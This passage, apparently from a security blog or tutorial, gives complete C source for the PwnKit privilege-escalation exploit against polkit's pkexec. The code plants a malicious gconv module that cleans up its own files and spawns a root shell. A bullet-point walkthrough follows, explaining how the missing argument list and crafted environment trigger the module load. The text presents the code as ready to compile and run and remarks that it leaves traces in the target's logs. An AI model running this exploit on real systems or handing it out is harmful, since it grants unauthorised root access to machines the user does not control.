#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>

char *shell = 
	"#include <stdio.h>\n"
	"#include <stdlib.h>\n"
	"#include <unistd.h>\n\n"
	"void gconv() {}\n"
	"void gconv_init() {\n"
	"	setuid(0); setgid(0);\n"
	"	seteuid(0); setegid(0);\n"
	"	system(\"export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin; rm -rf 'GCONV_PATH=.' 'pwnkit'; /bin/sh\");\n"
	"	exit(0);\n"
	"}";

int main(int argc, char *argv[]) {
	FILE *fp;
	system("mkdir -p 'GCONV_PATH=.'; touch 'GCONV_PATH=./pwnkit'; chmod a+x 'GCONV_PATH=./pwnkit'");
	system("mkdir -p pwnkit; echo 'module UTF-8// PWNKIT// pwnkit 2' > pwnkit/gconv-modules");
	fp = fopen("pwnkit/pwnkit.c", "w");
	fprintf(fp, "%s", shell);
	fclose(fp);
	system("gcc pwnkit/pwnkit.c -o pwnkit/pwnkit.so -shared -fPIC");
	char *env[] = { "pwnkit", "PATH=GCONV_PATH=.", "CHARSET=PWNKIT", "SHELL=pwnkit", NULL };
	execve("/usr/bin/pkexec", (char*[]){NULL}, env);
}
```

The exploit is then as simple as `gcc $FILE -o exploit; ./exploit`. 

*This version of the exploit will leave traces in the target's logs!*

Here's what happens on execution:

* The exploit creates the path `GCONV_PATH=.` in the current directory and adds an invalid executable file to it.
* The exploit creates a second directory called `pwnkit` and sets up a malicious shared library designed to be loaded by GLib to translate system messages to the made-up character set "PWNKIT".
* The exploit calls `pkexec` with a NULL argument list (this bit is important, since we need the length of the argument list to be 0 -- so, not even to contain the name of `pkexec` itself) *but* with a correctly set up (albeit malicious) environment via `execve()`. Importantly, the first "variable" in the environment is actually the name of the (invalid) executable in the `GCONV_PATH=.` directory.
* Polkit just falls through the loop that it would normally use to walk through the passed-in arguments. This causes what would be pointing to an executable name to instead point to the first environment variable that's passed into `execve()`, which happens to be string `pwnkit`.
* Polkit looks up the malicious executable, finds it in `GCONV_PATH=./pwnkit` (because we set the PATH to that directory), and then tries to replace the executable name with this full path. *Except* that it's still writing to the first element of the environment, which causes `pwnkit` to be replaced by `GCONV_PATH=./pwnkit`.
* Polkit the proceeds to sanitize its environment. When it comes to the invalid SHELL variable this sanitization fails and Polkit throws an error and dies. *But!* Before dying, Polkit tries to *print* the error using a GLib function that dutifully attempts to translate the message into the "PWNKIT" character set. To figure out how to do this, modules are loaded from GCONV_PATH... And we've defined a malicious module to do this that cleans up the exploit files and spawns a root shell (since `pkexec` is SUID root).
